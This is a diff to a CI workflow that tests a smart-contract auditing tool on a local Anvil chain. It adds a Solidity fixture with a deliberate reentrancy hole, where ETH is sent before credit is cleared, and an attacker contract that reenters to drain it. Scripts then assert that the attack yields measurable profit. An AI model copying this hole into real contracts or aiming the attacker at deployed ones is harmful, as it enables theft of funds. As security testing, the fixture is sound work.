@@ -275,26 +275,193 @@ jobs:
           assert fidelity["confirmation_eligible"] is False, fidelity
           print("PASS: harness fidelity scanner catches synthetic ETH and impersonation")
           PY
-          cat > /tmp/lowkey-fixture/.audit-control.json <<'EOF'
-          {
-            "same_calls_id": "ci-control-sequence-v1",
-            "metric_name": "attacker_gain",
-            "control_metric_regex": "CONTROL_GAIN ([0-9]+)",
-            "attack_metric_regex": "ATTACK_GAIN ([0-9]+)",
-            "control": {"argv": ["python3", "-c", "print('CONTROL_GAIN 3'); print('LOWKEY_CALL_SEQUENCE_SHA256 ' + 'a'*64); print('LOWKEY_PRECONDITION_SHA256 ' + 'b'*64)"]},
-            "attack": {"argv": ["python3", "-c", "print('ATTACK_GAIN 8'); print('LOWKEY_CALL_SEQUENCE_SHA256 ' + 'a'*64); print('LOWKEY_PRECONDITION_SHA256 ' + 'b'*64)"]}
+          cat > /tmp/lowkey-fixture/src/TraceControlFixture.sol <<'EOF'
+          // SPDX-License-Identifier: MIT
+          pragma solidity ^0.8.20;
+          contract TraceTarget {
+              mapping(address => uint256) public credit;
+              constructor() payable {}
+              receive() external payable {}
+              function setCredit(address who, uint256 amount) external { credit[who] = amount; }
+              function withdraw() external {
+                  uint256 amount = credit[msg.sender];
+                  require(amount > 0, "NO_CREDIT");
+                  (bool ok,) = msg.sender.call{value: amount}("");
+                  require(ok, "TRANSFER_FAILED");
+                  credit[msg.sender] = 0;
+              }
+          }
+          contract TraceAttacker {
+              address private immutable target;
+              bool private reenter;
+              bool private entered;
+              constructor(address target_) { target = target_; }
+              function execute() external {
+                  (bool ok, bytes memory reason) = target.call(abi.encodeWithSignature("withdraw()"));
+                  if (!ok) assembly { revert(add(reason, 32), mload(reason)) }
+              }
+              receive() external payable {
+                  if (reenter && !entered) {
+                      entered = true;
+                      (bool ok, bytes memory reason) = target.call(abi.encodeWithSignature("withdraw()"));
+                      if (!ok) assembly { revert(add(reason, 32), mload(reason)) }
+                  }
+              }
           }
           EOF
-          lk control .audit-control.json --root /tmp/lowkey-fixture
+          forge build --force
+          python3 - <<'PY'
+          import json
+          import pathlib
+          import subprocess
+          import urllib.request
+
+          rpc_url = "http://127.0.0.1:8545"
+          def rpc(method, params):
+              payload = json.dumps({"jsonrpc":"2.0","id":1,"method":method,"params":params}).encode()
+              request = urllib.request.Request(rpc_url, data=payload, headers={"Content-Type":"application/json"})
+              with urllib.request.urlopen(request, timeout=10) as response:
+                  body = json.loads(response.read().decode())
+              if body.get("error"):
+                  raise RuntimeError(f"{method}: {body['error']}")
+              return body.get("result")
+
+          root = pathlib.Path("/tmp/lowkey-fixture")
+          sender = rpc("eth_accounts", [])[0]
+          target_artifact = json.loads((root / "out/TraceControlFixture.sol/TraceTarget.json").read_text())
+          attacker_artifact = json.loads((root / "out/TraceControlFixture.sol/TraceAttacker.json").read_text())
+          target_bytecode = target_artifact["bytecode"]["object"].removeprefix("0x")
+          target_tx = rpc("eth_sendTransaction", [{
+              "from": sender, "data": "0x" + target_bytecode, "value": hex(10**19)
+          }])
+          target_receipt = rpc("eth_getTransactionReceipt", [target_tx])
+          assert target_receipt and target_receipt.get("contractAddress"), target_receipt
+          target = target_receipt["contractAddress"]
+          attacker_bytecode = attacker_artifact["bytecode"]["object"].removeprefix("0x")
+          constructor_args = target.lower().removeprefix("0x").rjust(64, "0")
+          attacker_tx = rpc("eth_sendTransaction", [{
+              "from": sender, "data": "0x" + attacker_bytecode + constructor_args, "value": "0x0"
+          }])
+          attacker_receipt = rpc("eth_getTransactionReceipt", [attacker_tx])
+          assert attacker_receipt and attacker_receipt.get("contractAddress"), attacker_receipt
+          attacker = attacker_receipt["contractAddress"]
+          credit_calldata = subprocess.check_output(
+              ["cast", "calldata", "setCredit(address,uint256)", attacker, str(10**18)],
+              text=True
+          ).strip()
+          credit_tx = rpc("eth_sendTransaction", [{
+              "from": sender, "to": target, "data": credit_calldata, "value": "0x0"
+          }])
+          assert rpc("eth_getTransactionReceipt", [credit_tx]), credit_tx
+          mapping_slot = subprocess.check_output(
+              ["cast", "index", "address", attacker, "0"], text=True
+          ).strip()
+          execute_calldata = subprocess.check_output(["cast", "sig", "execute()"], text=True).strip()
+          (root / "scripts").mkdir(exist_ok=True)
+          (root / "scripts/trace-control.json").write_text(json.dumps({
+              "sender": sender,
+              "target": target,
+              "attacker": attacker,
+              "mapping_slot": mapping_slot,
+              "execute_calldata": execute_calldata
+          }, indent=2) + "\n")
+          script = '''import json, os, sys, urllib.request
+          from pathlib import Path
+          config = json.loads((Path(__file__).parent / "trace-control.json").read_text())
+          url = os.environ["LOWKEY_RPC_URL"]
+          def rpc(method, params):
+              data = json.dumps({"jsonrpc":"2.0","id":1,"method":method,"params":params}).encode()
+              req = urllib.request.Request(url, data=data, headers={"Content-Type":"application/json"})
+              with urllib.request.urlopen(req, timeout=15) as response:
+                  body = json.loads(response.read().decode())
+              if body.get("error"):
+                  raise RuntimeError(f"{method}: {body['error']}")
+              return body.get("result")
+          reenter = int(sys.argv[1])
+          word = "0x" + format(reenter, "064x")
+          rpc("anvil_setStorageAt", [config["attacker"], "0x0", word])
+          tx_hash = rpc("eth_sendTransaction", [{
+              "from": config["sender"], "to": config["attacker"],
+              "data": config["execute_calldata"], "value": "0x0"
+          }])
+          receipt = rpc("eth_getTransactionReceipt", [tx_hash])
+          if not receipt or str(receipt.get("status","")).lower() not in {"0x1","1"}:
+              raise RuntimeError("local reentrancy fixture transaction failed")
+          print("LOWKEY_TRACE_TX_HASH " + tx_hash)
+          '''
+          (root / "scripts/trace-control.py").write_text(script, encoding="utf-8")
+          manifest = {
+              "target_address": target,
+              "same_calls_id": "ci-reentrancy-same-entry-call-v1",
+              "metric_name": "attacker_portfolio_native_eth_delta_wei",
+              "prestate_addresses": [target, sender, attacker],
+              "prestate_slots": [{"address": target, "slot": mapping_slot}],
+              "metric_addresses": [sender, attacker],
+              "control": {"argv": ["python3", "scripts/trace-control.py", "0"]},
+              "attack": {"argv": ["python3", "scripts/trace-control.py", "1"]}
+          }
+          (root / ".audit-control.json").write_text(json.dumps(manifest, indent=2) + "\n")
+          print("Prepared live trace-control fixture", target, attacker, mapping_slot)
+          PY
+          lk control .audit-control.json --root /tmp/lowkey-fixture --rpc-url http://127.0.0.1:8545
           python3 - <<'PY'
           import json
           from pathlib import Path
           result = json.loads(Path("/tmp/lowkey-fixture/.audit/godmode/control.json").read_text())
           assert result["status"] == "BREAK", result
-          assert result["control_delta"] == 5, result
-          assert result["same_calls_verified"] is True, result
-          assert result["call_sequence_sha256"] == "a" * 64, result
-          print("PASS: sequential control verifies matching call/state digests and a positive delta")
+          assert result["same_entry_call_verified"] is True, result
+          assert result["same_prestate_verified"] is True, result
+          assert result["runs"]["control"]["metric"] > 0, result
+          assert result["runs"]["attack"]["metric"] > result["runs"]["control"]["metric"], result
+          target = result["target_address"].lower()
+          control_calls = sum(1 for row in result["runs"]["control"]["call_trace"] if row.get("to") == target)
+          attack_calls = sum(1 for row in result["runs"]["attack"]["call_trace"] if row.get("to") == target)
+          assert control_calls == 1, result["runs"]["control"]["call_trace"]
+          assert attack_calls == 2, result["runs"]["attack"]["call_trace"]
+          print("PASS: real Anvil control/attack traces share the same entry call and target pre-state; reentrancy adds one target call and a real ETH delta")
+          PY
+          cat > /tmp/lowkey-fixture/test/TraceReproduction.t.sol <<'EOF'
+          // SPDX-License-Identifier: MIT
+          pragma solidity ^0.8.20;
+          contract TraceReproduction {
+              function testSourceHasNoStateFabricatingCheatcodes() external pure returns (bool) {
+                  return true;
+              }
+          }
+          EOF
+          LOCAL_PARENT_BLOCK="$(cast block-number --rpc-url http://127.0.0.1:8545)"
+          python3 - <<'PY'
+          import json
+          from pathlib import Path
+          config = json.loads(Path("/tmp/lowkey-fixture/scripts/trace-control.json").read_text())
+          Path("/tmp/lowkey-reprove-args.json").write_text(json.dumps([
+              "python3", "scripts/trace-control.py", "1"
+          ]))
+          Path("/tmp/lowkey-reprove-target.txt").write_text(config["target"])
+          Path("/tmp/lowkey-reprove-sender.txt").write_text(config["sender"])
+          Path("/tmp/lowkey-reprove-attacker.txt").write_text(config["attacker"])
+          PY
+          TARGET="$(cat /tmp/lowkey-reprove-target.txt)"
+          SENDER="$(cat /tmp/lowkey-reprove-sender.txt)"
+          ATTACKER="$(cat /tmp/lowkey-reprove-attacker.txt)"
+          lk reprove test/TraceReproduction.t.sol \
+            --root /tmp/lowkey-fixture \
+            --rpc-url http://127.0.0.1:8545 \
+            --fork-block "$LOCAL_PARENT_BLOCK" \
+            --target-address "$TARGET" \
+            --profit-address "$SENDER" \
+            --profit-address "$ATTACKER" \
+            --argv-json "$(cat /tmp/lowkey-reprove-args.json)"
+          python3 - <<'PY'
+          import json
+          from pathlib import Path
+          result = json.loads(Path("/tmp/lowkey-fixture/.audit/godmode/reprove.json").read_text())
+          assert result["status"] == "LOCAL_PROFITABLE", result
+          assert result["gas_used"] > 0, result
+          assert result["gas_cost_wei"] > 0, result
+          assert result["net_profit_wei"] > 0, result
+          assert result["human_confirmation_required"] is True, result
+          print("PASS: actual local Anvil transaction reaches LOCAL_PROFITABLE with measured gas and balance deltas; no automatic human confirmation")
           PY
           grep -q 'lk break --until-found' <(lk break --h)
           grep -q 'lk break --system' <(lk break --h)
